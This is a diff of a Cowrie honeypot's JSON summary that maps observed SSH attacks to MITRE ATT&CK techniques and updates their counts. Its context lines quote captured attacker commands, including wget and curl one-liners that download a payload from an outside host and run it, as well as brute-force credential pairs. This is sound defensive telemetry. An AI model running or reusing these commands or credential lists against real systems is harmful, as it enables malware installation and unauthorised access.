@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-01 16:02:07",
+  "generated": "2026-09-01 17:03:13",
   "totals": {
-    "commands": 818,
-    "login_failed": 12177,
-    "login_success": 188,
-    "sessions": 12525
+    "commands": 835,
+    "login_failed": 12243,
+    "login_success": 195,
+    "sessions": 12623
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 12177,
+      "count": 12243,
       "examples": [
         "admin / 1111",
         "root / Password01",
@@ -21,14 +21,14 @@
         "ubuntu / 123456"
       ],
       "first": "2026-09-01T00:00:06.311906Z",
-      "last": "2026-09-01T16:01:29.253583Z",
-      "unique_ips": 182
+      "last": "2026-09-01T17:03:10.818364Z",
+      "unique_ips": 193
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 188,
+      "count": 195,
       "examples": [
         "enable\\x00 / linuxshell\\x00",
         "enable\\x00 / system\\x00",
@@ -37,8 +37,8 @@
         "zabbix / zabbix"
       ],
       "first": "2026-09-01T00:00:14.423114Z",
-      "last": "2026-09-01T15:44:39.020221Z",
-      "unique_ips": 99
+      "last": "2026-09-01T16:48:39.927418Z",
+      "unique_ips": 102
     },
     {
       "id": "T1222.002",
@@ -60,7 +60,7 @@
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 29,
+      "count": 31,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "http://185.93.89.72/wget",
@@ -69,8 +69,8 @@
         "curl -sL -o /tmp/install.sh https://del.sou.pp.ua/install.sh && bash /tmp/install.sh; rm -f /tmp/install.sh"
       ],
       "first": "2026-09-01T02:10:48.855600Z",
-      "last": "2026-09-01T13:40:35.152200Z",
-      "unique_ips": 8
+      "last": "2026-09-01T16:15:16.049999Z",
+      "unique_ips": 9
     },
     {
       "id": "T1082",
@@ -195,19 +195,19 @@
     ],
     [
       "shell",
-      92
+      95
     ],
     [
       "sh",
-      91
+      94
     ],
     [
       "system",
-      90
+      93
     ],
     [
       "/bin/busybox UNSTABLE",
-      83
+      86
     ],
     [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
